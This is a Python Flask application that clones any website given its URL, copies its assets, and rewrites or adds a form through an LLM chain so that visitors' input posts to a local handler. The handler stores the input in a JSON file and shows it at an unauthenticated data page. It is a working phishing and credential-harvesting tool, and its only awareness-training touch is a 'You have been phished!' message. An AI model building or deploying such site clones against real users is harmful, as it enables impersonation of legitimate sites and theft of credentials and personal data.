from flask import Flask, request, render_template, redirect, url_for, jsonify, send_from_directory
from bs4 import BeautifulSoup
import os
import requests
import json
from langchain.chains import LLMChain
from langchain.prompts import PromptTemplate
from langchain.llms import OpenAI

app = Flask(__name__)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Initialize the LangChain model
llm = OpenAI(temperature=0)

# Define the prompt template
prompt_template = PromptTemplate(input_variables=["action_url"], template="""
Generate a simple HTML form with one text input and a submit button. 
The form should have the action URL set to {action_url} and the method set to "POST".
""")

# Create the LLMChain
form_chain = LLMChain(prompt=prompt_template, llm=llm)

def scrape_website(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    return soup

def copy_resources(soup, base_url, target_dir):
    if not os.path.exists(target_dir):
        os.makedirs(target_dir)

    static_dir = os.path.join(target_dir, 'static')
    if not os.path.exists(static_dir):
        os.makedirs(static_dir)
    
    for tag in soup.find_all(['link', 'script', 'img']):
        attr = 'href' if tag.name == 'link' else 'src'
        if tag.has_attr(attr):
            resource_url = tag[attr]
            if resource_url.startswith(('http', 'https')):
                resource_content = requests.get(resource_url).content
                resource_path = os.path.join(static_dir, os.path.basename(resource_url))
                with open(resource_path, 'wb') as f:
                    f.write(resource_content)
                tag[attr] = url_for('serve_static_file', site_id=os.path.basename(target_dir), filename=os.path.basename(resource_url))
    
    with open(os.path.join(target_dir, 'index.html'), 'w') as file:
        file.write(str(soup))

def generate_form_with_langchain(action_url):
    form_html = form_chain.run(action_url=action_url)
    return form_html

def add_phishing_form(soup, target_dir, site_id):
    form = soup.find('form')
    if not form:
        action_url = url_for('handle_submit', site_id=site_id)
        form_html = generate_form_with_langchain(action_url)
        form_soup = BeautifulSoup(form_html, 'html.parser')
        soup.body.insert(0, form_soup)
    else:
        form['action'] = url_for('handle_submit', site_id=site_id)
        form['method'] = 'POST'
    
    with open(os.path.join(target_dir, 'index.html'), 'w') as file:
        file.write(str(soup))

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        url = request.form['url']
        site_id = len(os.listdir(os.path.join(BASE_DIR, 'generated_sites')))
        target_dir = os.path.join(BASE_DIR, 'generated_sites', str(site_id))
        data_dir = os.path.join(target_dir, 'data')
        if not os.path.exists(data_dir):
            os.makedirs(data_dir)
        soup = scrape_website(url)
        copy_resources(soup, url, target_dir)
        add_phishing_form(soup, target_dir, site_id)
        return redirect(url_for('view_generated_site', site_id=site_id))

    return render_template('index.html')

@app.route('/site/<int:site_id>')
def view_generated_site(site_id):
    generated_site_dir = os.path.join(BASE_DIR, 'generated_sites', str(site_id))
    return send_from_directory(generated_site_dir, 'index.html')

@app.route('/site/<int:site_id>/static/<path:filename>')
def serve_static_file(site_id, filename):
    static_dir = os.path.join(BASE_DIR, 'generated_sites', str(site_id), 'static')
    return send_from_directory(static_dir, filename)

@app.route('/submit/<int:site_id>', methods=['POST'])
def handle_submit(site_id):
    data = request.form['user_input']
    data_file = os.path.join(BASE_DIR, 'generated_sites', str(site_id), 'data', 'data.json')
    
    if os.path.exists(data_file):
        with open(data_file, 'r') as file:
            data_list = json.load(file)
    else:
        data_list = []

    data_list.append(data)
    with open(data_file, 'w') as file:
        json.dump(data_list, file)
    
    return f"""
    <h1>You have been phished!</h1>
    <p>Your submitted data: {data}</p>
    <p><a href='/data/{site_id}'>View Collected Data</a></p>
    <p>Please delete your data if it's real and take necessary precautions.</p>
    """

@app.route('/data/<int:site_id>')
def view_data(site_id):
    data_file = os.path.join(BASE_DIR, 'generated_sites', str(site_id), 'data', 'data.json')
    if os.path.exists(data_file):
        with open(data_file, 'r') as file:
            data_list = json.load(file)
        return jsonify(data_list)
    else:
        return "No data found."

@app.route('/delete/<int:site_id>/<int:data_index>', methods=['POST'])
def delete_data(site_id, data_index):
    data_file = os.path.join(BASE_DIR, 'generated_sites', str(site_id), 'data', 'data.json')
    if os.path.exists(data_file):
        with open(data_file, 'r') as file:
            data_list = json.load(file)
        if 0 <= data_index < len(data_list):
            data_list.pop(data_index)
            with open(data_file, 'w') as file:
                json.dump(data_list, file)
    return redirect(url_for('view_data', site_id=site_id))

if __name__ == '__main__':
    app.run(debug=True)
